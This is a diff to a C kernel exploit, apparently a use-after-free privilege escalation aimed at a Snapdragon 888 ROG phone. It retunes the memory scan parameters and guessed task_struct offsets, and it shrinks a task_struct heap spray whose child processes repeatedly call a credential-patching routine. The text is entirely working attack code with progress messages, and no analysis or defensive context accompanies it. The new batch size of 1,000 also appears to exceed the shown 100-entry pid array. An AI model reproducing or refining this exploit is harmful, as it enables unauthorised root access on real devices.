@@ -42,8 +42,8 @@
 #define UAF_START            0x7001FF000ULL
 #define UAF_SIZE             0x10004000ULL
 #define UAF_SCAN_SIZE        0x04000000ULL
-#define SCAN_PAGE_STEP       2U
-#define SCAN_MAX_PAGES       1024U
+#define SCAN_PAGE_STEP       8U
+#define SCAN_MAX_PAGES       256U
 #define SCAN_PROGRESS_EVERY  128U
 #define OVERLAP_START        0x7001FE000ULL
 #define OVERLAP_SIZE         0x00007000ULL
@@ -1882,10 +1882,8 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
     fprintf(stderr, "      [*] Scanning FULL pages for KETO0422 and kernel pointers...\n");
     fflush(stderr);
 
-    uint64_t uaf_base_offsets[] = {
-        0x780, 0x0, 0x800, 0x400, 0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380,
-        0xc00, 0xa00, 0x600, 0xe00, 0x500, 0x700, 0x900, 0xb00, 0xd00, 0xf00,
-        0x080, 0x480, 0x580, 0x680, 0x880, 0x980, 0xa80, 0xb80, 0xc80, 0xd80, 0xe80, 0xf80};
+    // ROG SD888 typical task_struct offsets - Picked most likely ones
+    uint64_t uaf_base_offsets[] = {0x0, 0x80, 0x400, 0x800, 0xc00};
     int num_offsets = sizeof(uaf_base_offsets) / sizeof(uaf_base_offsets[0]);
     int marker_found = 0;
     int total_pages_scanned = 0;
@@ -2861,9 +2859,9 @@ restart:;
         fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
     }
 
-    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 100,000)\n");
-    int total_limit = 100000;
-    int batch_size = 100;
+    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 8,000)\n");
+    int total_limit = 8000;
+    int batch_size = 1000;
     int total_sprayed = 0;
     int marker_found_global = 0;
     pid_t spray_pids[100];
@@ -2883,7 +2881,7 @@ restart:;
                 // Чтобы task_struct не уснул слишком глубоко
                 while(1) { 
                     if (gbuf[0] == 0xab) safe_cred_patch();
-                    usleep(100000); 
+                    usleep(500000); 
                 }
                 exit(0);
             }
@@ -2914,7 +2912,7 @@ restart:;
     }
 
     if (!marker_found_global) {
-        fprintf(stderr, "\n[!] 100,000 sprays exhausted. Marker not found.\n");
+        fprintf(stderr, "\n[!] 8,000 sprays exhausted. Marker not found.\n");
         return 1;
     }
 
